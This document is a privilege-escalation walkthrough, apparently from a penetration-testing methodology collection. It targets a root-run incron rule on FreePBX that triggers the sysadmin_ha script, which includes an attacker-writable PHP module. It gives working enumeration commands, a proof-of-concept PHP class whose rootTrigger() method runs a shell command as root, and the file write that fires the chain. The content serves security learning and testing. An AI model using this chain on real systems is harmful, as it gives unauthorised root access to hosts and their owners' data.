# Privilege Escalation Method - Incron Event-Driven Root Execution (FreePBX sysadmin_ha Chain)

## Vulnerability  
The vulnerability arises from a misconfigured `incron` service running as root, combined with a root-executed PHP hook system (`sysadmin_ha`) that dynamically includes attacker-writable module files.

When filesystem events occur on attacker-writable paths monitored by `incron`, root triggers a PHP execution chain that includes and executes user-controlled PHP code, leading to full privilege escalation.

This results in **root-level code execution via filesystem event injection**.

---

## Conditions
- `incrond` service is running as root  
- Active incron rules exist (or are partially misconfigured/loaded in spool directory)  
- A filesystem path monitored by incron is writable by the attacker  
- The triggered command executes a root-owned script (e.g. `sysadmin_ha`)  
- The root script includes attacker-writable PHP module files without proper integrity enforcement  
- The included PHP file defines expected class/method structure (`incron::rootTrigger()`)

---

## Exploitation and Key Concepts

### 1. Identify incron service
Check if incron daemon is running:

```bash
ps aux | grep incrond
```

2. Identify incron rules

Check for active or stored rules:

```bash
incrontab -l
cat /var/spool/incron/*
ls -la /etc/incron.d/
```

Look for rules that map writable filesystem paths to root-executed scripts.

Example rule <file> <trigger> <command>:
```bash
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```

3. Identify writable watched paths

Find watched directories or files that can be modified:
```bash
ls -l <file>
```

Validate write access:
```bash
echo test > <file>
```
4. Analyze execution script <command>
```bash
cat <command>
```
Example behavior:

- Executes as root
- Loads `PHP` module file via `require` or `include`
- Instantiates class and calls a function from `PHP` module

Example flow:
```php
require_once("/path/to/incron.php");
$incron = new incron;
$incron->rootTrigger();
```
The vulnerability exists when the included PHP file is attacker-writable:


5. Payload development
Proof of Concept
```php
<?php
class incron {
    public function rootTrigger() {
        exec("touch /tmp/pwned.txt");
    }
}
```
Trigger the incron event by modifying the watched file:
```bash
echo test > /usr/local/asterisk/ha_trigger
```
